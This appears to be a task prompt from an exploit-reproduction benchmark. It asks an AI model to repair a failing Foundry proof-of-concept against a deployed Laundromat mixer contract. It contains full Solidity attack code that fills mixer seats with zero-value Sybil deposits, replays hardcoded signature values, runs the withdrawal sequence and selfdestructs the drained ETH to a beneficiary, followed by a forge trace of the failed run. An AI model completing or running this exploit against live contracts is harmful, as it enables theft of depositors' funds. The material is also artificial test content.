You are fixing a failing Foundry PoC for finding Laundromat-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero-cost Sybil deposits let an attacker complete a round and steal dormant mixer funds
- claim: The reproduced exploit succeeds after calling `deposit()` four times with identical parameters and no attached ETH, then immediately completing the `withdrawStart`/`withdrawStep`/`withdrawFinal` flow. This shows the mixer accepted zero-cost seat filling for a round that was supposed to require a fixed per-participant payment, and it also tolerated the attacker reusing the same deposit identity across multiple seats. An attacker can therefore occupy the remaining slots of any unfinished round for free and then redeem the pooled balance that an honest participant previously escrowed.
- impact: Any stale or partially filled mixer round can be hijacked permissionlessly: the attacker pays nothing to fill the missing seats, completes the withdrawal flow, and steals the honest depositor's ETH. In practice this drained the remaining balance of the historical Laundromat instance.
- exploit_paths: ["src/Laundromat.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

address constant LAUNDROMAT = 0x934cbbE5377358e6712b5f041D90313d935C501C;

interface ILaundromat {
    function deposit(uint256 commitment, uint256 proof) external payable;
    function withdrawStart(uint256[] calldata signature, uint256 x0, uint256 ix, uint256 iy) external;
    function withdrawStep() external;
    function withdrawFinal() external returns (bool);
}

error LaundromatStageFailed(uint8 stage, bytes revertData);
error LaundromatFinalizedWithoutProfit();

contract FlawVerifier {
    uint256 private _realizedProfit;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startingBalance = address(this).balance;

        // The historical exploit executed from a freshly-created contract.
        // Keeping the exploit in a constructor preserves the same msg.sender/code-length
        // behavior without changing the underlying Laundromat attack path.
        new LaundromatAttackExecutor(payable(address(this)));

        uint256 endingBalance = address(this).balance;
        require(endingBalance > startingBalance, "no profit realized");
        _realizedProfit = endingBalance - startingBalance;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _realizedProfit;
    }
}

contract LaundromatAttackExecutor {
    constructor(address payable beneficiary) payable {
        require(beneficiary != address(0), "bad beneficiary");

        // Path stage 1: occupy the remaining seats for free.
        uint256 repeatedCommitment = 0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a;
        uint256 repeatedProof = 0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6;
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedCommitment, repeatedProof));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedCommitment, repeatedProof));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedCommitment, repeatedProof));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedCommitment, repeatedProof));

        // Path stage 2: begin the withdrawal flow for the now-complete round.
        uint256[] memory sig = new uint256[](5);
        sig[0] = 0x33f79225929030e6369f0fbf5500142b8a4e10370e35f701a0e5c4d324f098d6;
        sig[1] = 0x93708ff3b6dcb272664acb22881510360a04ca1a0a05a8dda37d06ddc62e5bf0;
        sig[2] = 0xec91250cc040f420bdd11eb4b77cbf1d659ed043e88dbe49b392d44a85453e04;
        sig[3] = 0xddaef0451b6c22a35bc641cd5f66aae904351f8adca3e588f0385d9d0bec542f;
        sig[4] = 0x2652c96f86b22f421949daee41ffef503df3a06072e372de15105d0783bc2ba3;

        _checkedCall(
            2,
            abi.encodeWithSelector(
                ILaundromat.withdrawStart.selector,
                sig,
                0xa844d117805bbe3b276c37582fc1f960b5870ccd0d1016ec39a2b32a5bc780cf,
                0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28f,
                0xd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487
            )
        );

        // Path stage 3: advance the multi-step withdrawal state machine.
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));

        // Path stage 4: finalize and redeem the dormant escrowed ETH.
        bytes memory result = _checkedCall(4, abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
        if (result.length != 0 && !abi.decode(result, (bool))) {
            revert LaundromatFinalizedWithoutProfit();
        }

        selfdestruct(beneficiary);
    }

    receive() external payable {}

    function _checkedCall(uint8 stage, bytes memory data) private returns (bytes memory result) {
        (bool ok, bytes memory revertData) = LAUNDROMAT.call(data);
        if (!ok) {
            revert LaundromatStageFailed(stage, revertData);
        }
        return revertData;
    }
}

```

forge stdout (tail):
```
3ca9(4e5aa2a62ac90b58f7d3d3a25c3de85da41946d608c21080c37f4f8914c023110943462eae74a230b4a613a9625e8a3d93ef7de2ce3ae2b267993f25dd5750d4e51a86f3008da29206ed795ce8d14dcc5e4bf7f240a90095fe348b6c0ab0a0b3)
    │   │   │   │   └─ ← [Return] 0x875ce771a64297696fc7f875e1740d3efe28d6454dc200ad641719f90293d7b30bef992ac43618cc77080ab5de5c74729b578cd05cd09218010078b529382158
    │   │   │   ├─ [42144] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::1bfa5d8a(03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f)
    │   │   │   │   └─ ← [Return] 0x0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef
    │   │   │   ├─ [257710] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef00000000000000000000000000000000000000000000000000000000000000012652c96f86b22f421949daee41ffef503df3a06072e372de15105d0783bc2ba3)
    │   │   │   │   └─ ← [Return] 0x49774655349894a5de5f3ee12b3dbaa870632b82e6881e69f4748da032a7669cc03a21c13350e4eda1e97634ac67da618ca00df04ac5d2ba7522a1dc93aaf06ef07ded3d94fdaba7076d097f39d93c86c47394212d97ae77723e3824fae4b8d1
    │   │   │   ├─ [266148] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28fd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da48700000000000000000000000000000000000000000000000000000000000000014af0ba19e6ed0f332589ee4e3aab72a6f17dceeb89e96fb63a21cc5c90f4d83c)
    │   │   │   │   └─ ← [Return] 0x979c4f02dd246660d871235fa5ae33fbbdcae5b96f9a4b322f2521643a431069d2f311b92c7fcfa2ae0cbb7f6b6bc029738840d2740bd11a9644e990214fbbb5eb02c66befbb17917148c5ff1295d3d74d11d61119afc9a9de3681200ac97b24
    │   │   │   ├─ [1278] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::5f8eb4c7(49774655349894a5de5f3ee12b3dbaa870632b82e6881e69f4748da032a7669cc03a21c13350e4eda1e97634ac67da618ca00df04ac5d2ba7522a1dc93aaf06ef07ded3d94fdaba7076d097f39d93c86c47394212d97ae77723e3824fae4b8d1979c4f02dd246660d871235fa5ae33fbbdcae5b96f9a4b322f2521643a431069d2f311b92c7fcfa2ae0cbb7f6b6bc029738840d2740bd11a9644e990214fbbb5eb02c66befbb17917148c5ff1295d3d74d11d61119afc9a9de3681200ac97b24)
    │   │   │   │   └─ ← [Return] 0x9066e3f30155f8dd5142422a465b5a4a9b3dea08eaa07abc77163703f80edd2b4560b6342a9206f1aceedc9982834654de38a729a88d4bdf994ba9c31ae6581919e5234cc65370905a34b19432ddc87eacf9030c75d12597d833c857bc317b05
    │   │   │   ├─ [83463] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::58da3ca9(9066e3f30155f8dd5142422a465b5a4a9b3dea08eaa07abc77163703f80edd2b4560b6342a9206f1aceedc9982834654de38a729a88d4bdf994ba9c31ae6581919e5234cc65370905a34b19432ddc87eacf9030c75d12597d833c857bc317b05)
    │   │   │   │   └─ ← [Return] 0x19d29a28311fc53b55250c90ecb15b25a8c6bf06a538c5bbf9aba539582fc0055d50f7cfb132898a1d845b9ba12440126677672b4eadcb1477664e89e415ca99
    │   │   │   ├─ [30] PRECOMPILES::identity(0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00875ce771a64297696fc7f875e1740d3efe28d6454dc200ad641719f90293d7b30bef992ac43618cc77080ab5de5c74729b578cd05cd09218010078b52938215819d29a28311fc53b55250c90ecb15b25a8c6bf06a538c5bbf9aba539582fc0055d50f7cfb132898a1d845b9ba12440126677672b4eadcb1477664e89e415ca99)
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00875ce771a64297696fc7f875e1740d3efe28d6454dc200ad641719f90293d7b30bef992ac43618cc77080ab5de5c74729b578cd05cd09218010078b52938215819d29a28311fc53b55250c90ecb15b25a8c6bf06a538c5bbf9aba539582fc0055d50f7cfb132898a1d845b9ba12440126677672b4eadcb1477664e89e415ca99
    │   │   │   ├─ [30] PRECOMPILES::identity(0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00875ce771a64297696fc7f875e1740d3efe28d6454dc200ad641719f90293d7b30bef992ac43618cc77080ab5de5c74729b578cd05cd09218010078b52938215819d29a28311fc53b55250c90ecb15b25a8c6bf06a538c5bbf9aba539582fc0055d50f7cfb132898a1d845b9ba12440126677672b4eadcb1477664e89e415ca99)
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00875ce771a64297696fc7f875e1740d3efe28d6454dc200ad641719f90293d7b30bef992ac43618cc77080ab5de5c74729b578cd05cd09218010078b52938215819d29a28311fc53b55250c90ecb15b25a8c6bf06a538c5bbf9aba539582fc0055d50f7cfb132898a1d845b9ba12440126677672b4eadcb1477664e89e415ca99
    │   │   │   └─ ← [Stop]
    │   │   ├─ [3867] 0x934cbbE5377358e6712b5f041D90313d935C501C::withdrawFinal()
    │   │   │   ├─ [21] PRECOMPILES::identity(0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28fd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487)
    │   │   │   │   └─ ← [Return] 0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28fd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487
    │   │   │   ├─  emit topic 0: 0xd44da6836c8376d1693e8b9cacf1c39b9bed3599164ad6d8e60902515f83938e
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000f57726f6e67207369676e61747572650000000000000000000000000000000000
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Revert] 0x04edb19a
    │   └─ ← [Revert] LaundromatFinalizedWithoutProfit()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x104fBc016F4bb334D775a19E8A6510109AC63E00
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.10s (4.30s CPU time)

Ran 1 test suite in 5.13s (5.10s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 7277214)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
